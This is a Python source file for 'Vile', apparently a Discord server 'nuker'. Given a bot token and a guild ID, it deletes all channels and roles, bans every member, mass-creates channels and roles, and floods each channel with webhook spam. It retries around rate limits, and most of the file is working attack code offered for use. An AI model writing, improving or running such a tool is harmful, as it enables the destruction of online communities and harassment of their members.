import os, asyncio, aiohttp, sys, random, time
from datetime import datetime
from packaging import version
try:
    from pystyle import Colorate, Write, System, Colors, Center, Anime
    import requests
except:
    os.system('pip install pystyle')
    os.system('pip install requests')
    
    
    
__VERSION__ = '1.7382047493'  

try:
    os.system('cls')
        
except:
    os.system('clear')
    
def get_token():
    global token
    token = input("Bot Token?:  ")
    headers = {
        "Authorization": f"Bot {token}"
    }
    if not 'id' in requests.Session().get("https://discord.com/api/v10/users/@me", headers=headers).json():
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mInvalid Token\033[0m")
        return get_token()
     
get_token()
guild_id = input("Guild ID?:  ")

headers = {
  "Authorization": f"Bot {token}"
}

def check_version():
    global git_ver
    git_ver = requests.get('https://raw.githubusercontent.com/SurvivorJosh/vile/master/VERSION.txt').text
    
    if version.parse(git_ver) > version.parse(__VERSION__):
        logo = f'''
        
               NEW VERSION OF VILE IS AVAILABLE -->  {version.parse(git_ver)}  <--
                 
 ███▄    █ ▓█████  █     █░    ██▒   █▓▓█████  ██▀███    ██████  ██▓ ▒█████   ███▄    █ 
 ██ ▀█   █ ▓█   ▀ ▓█░ █ ░█░   ▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██  ▀█ ██▒▒███   ▒█░ █ ░█     ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒██▒▒██░  ██▒▓██  ▀█ ██▒
▓██▒  ▐▌██▒▒▓█  ▄ ░█░ █ ░█      ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒░██░▒██   ██░▓██▒  ▐▌██▒
▒██░   ▓██░░▒████▒░░██▒██▓       ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░██░░ ████▓▒░▒██░   ▓██░
░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▓░▒ ▒        ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░ ░ ░  ░  ▒ ░ ░        ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
   ░   ░ ░    ░     ░   ░          ░░     ░     ░░   ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░ 
         ░    ░  ░    ░             ░     ░  ░   ░           ░   ░      ░ ░           ░ 
                                   ░                                                           
                            PRESS ENTER TO IGNORE
        '''
        
        Anime.Fade(Center.Center(logo), Colors.red_to_black, Colorate.Vertical, interval=0.020, enter=True)

check_version()

def purplepink(text):
    os.system(""); faded = ""
    red = 120
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

        


async def create_channels(session,channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Channel to {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}")
            pass

async def create_roles(session,role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Role to {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Role to {guild_id}")
            pass

async def send_message(hook, message, amount:int):
    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            await session.post(hook,json={'content': message, 'tts': False})
            
            
async def WebhookSpam(session, channel_id, web_name, msg_amt:int, msg):
  
    try:
        async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
            if r.status == 429:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
            else:
                if r.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Webhook {web_name} to {channel_id}")
                    webhook_raw = await r.json()
                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                    asyncio.create_task(send_message(webhook, msg, msg_amt))
                    
                    
    except:
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCreate Webhook to {channel_id}")
        
        
async def get_roles():
   
    roleIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
       
             m = await r.json()
             for role in m:
                roleIDS.append(role["id"])
            
    except TypeError:
        print("you are being banned from discord")
         
    return roleIDS

async def get_channels():
   
    channelIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
       
             m = await r.json()
             for channel in m:
                 channelIDS.append(channel["id"])
            
    except TypeError:
        print("you are being banned from discord")
         
    return channelIDS
    
    
async def get_members():
   
    memberIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
       
             m = await r.json()
             for member in m:
                memberIDS.append(member["user"]["id"])
            
    except TypeError:
        print("you are being banned from discord")
         
    return memberIDS

async def ban_members(session, member_id:str):
    while True:
        try:
            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mBanned Member {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Ban Member {member_id}")

async def delete_channels(session, channel_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Channel {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}")

async def delete_role(session, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Role {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Role {role_id}")

def slow_write(text):
    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.0005)
async def main():
    try:
        os.system('cls')
        
    except:
        os.system('clear')
        
    logo = Center.XCenter(f"""     
 ▄█    █▄   ▄█   ▄█          ▄████████
███    ███ ███  ███         ███    ███
███    ███ ███▌ ███         ███    █▀
███    ███ ███▌ ███        ▄███▄▄▄
███    ███ ███▌ ███       ▀▀███▀▀▀
███    ███ ███  ███         ███    █▄
███    ███ ███  ███▌    ▄   ███    ███
 ▀██████▀  █▀   █████▄▄██   ██████████
                ▀                      
    """)
    time.sleep(0.0002)
    #print(Colorate.Vertical(Colors.red_to_purple, logo))
    print(purplepink(logo), end='')
    slow_write(Center.XCenter(f"""
                                         \033[38;2;255;225;0m> M\033[0m\033[38;2;255;245;0ma\033[0m\033[38;2;255;235;0md\033[0m\033[38;2;255;225;0me \033[0m\033[38;2;255;215;0mb\033[0m\033[38;2;255;205;0my\033[0m \033[38;2;255;195;0mf\033[0m\033[38;2;255;185;0my\033[0m\033[38;2;255;175;0mm\033[0m\033[38;2;255;165;0mj\033[0m\033[38;2;255;155;0mo\033[0m\033[38;2;255;145;0ms\033[0m\033[38;2;255;135;0mh\033[0m\033[38;2;255;125;0m#\033[0m\033[38;2;255;115;0m0\033[0m\033[38;2;255;105;0m0\033[0m\033[38;2;255;95;0m0\033[0m\033[38;2;255;85;0m1\033[0m \033[38;2;255;75;0m&\033[0m \033[38;2;255;65;0ms\033[0m\033[38;2;255;55;0mh\033[0m\033[38;2;255;45;0mi\033[0m\033[38;2;255;35;0mr\033[0m\033[38;2;255;25;0ma\033[0m\033[38;2;255;15;0m#\033[0m\033[38;2;255;5;0m4\033[0m\033[38;2;255;0;0m321\033[0m
    """))
    print(Center.XCenter(f"""                                  
                          \033[38;2;255;0;205m╔══════════════════════════════╦═══════════════════════════════╗\033[0m
                          \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)}      \033[38;2;255;0;180m║   \033[37mNew Version: {version.parse(git_ver)}   \033[38;2;255;0;180m║
                          \033[38;2;255;0;155m╚══════════════════════════════╩═══════════════════════════════╝\033[0m
                 \033[38;2;255;0;130m╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
                 \033[38;2;255;0;105m║   \033[37m[1] Delete Channels    \033[38;2;255;0;105m║    \033[37m[2] Delete Roles      \033[38;2;255;0;105m║    \033[37m[3] Ban Members     \033[38;2;255;0;105m║\033[0m
                 \033[38;2;255;0;80m╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
                 \033[38;2;255;0;55m║   \033[37m[4] Create Channels    \033[38;2;255;0;55m║    \033[37m[5] Create Roles      \033[38;2;255;0;55m║    \033[37m[6] Webhook Spam    \033[38;2;255;0;55m║\033[0m
                 \033[38;2;255;0;30m╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m             
    """))
    choose = input("                                        > ")
    if choose == '1':
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_channels(session, channel_id) for channel_id in channels])
           #async with tasksio.TaskPool(20_000) as pool:
              # for channel_id in channels:
                   #await pool.put(delete_channels(session, channel_id))

        await asyncio.sleep(1)
        await main()
    
    elif choose == '2':
        roles = await get_roles()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_role(session, role_id) for role_id in roles])
           

        await asyncio.sleep(1)
        await main()
    
    elif choose == '4':
        chan_name = input("                                        Channel Name?:  ")
        amt = int(input("                                        Amount?:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_channels(session, chan_name, 0) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()        
    elif choose == '6':
        web_name = input("                                        Webhook Name?:  ")
        web_msg = input("                                        Webhook Content?:  ")
        msg_amt = int(input("                                        Amount of Messages?:  "))
        
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[WebhookSpam(session, channel_id, web_name, msg_amt, web_msg) for channel_id in channels])
            
            
            
        await asyncio.sleep(1)
        await main()
    elif choose == '3':
        members = await get_members()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[ban_members(session, member_id) for member_id in members])
            
            
        await asyncio.sleep(1)
        await main()
        
    elif choose == '5':
        role_name = input("                                        Role Name?:  ")
        amt = int(input("                                        Amount?:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_roles(session, role_name) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()
        
    else:
        await asyncio.sleep(1)
        await main()

if __name__ == "__main__":
    
    asyncio.run(main())
    
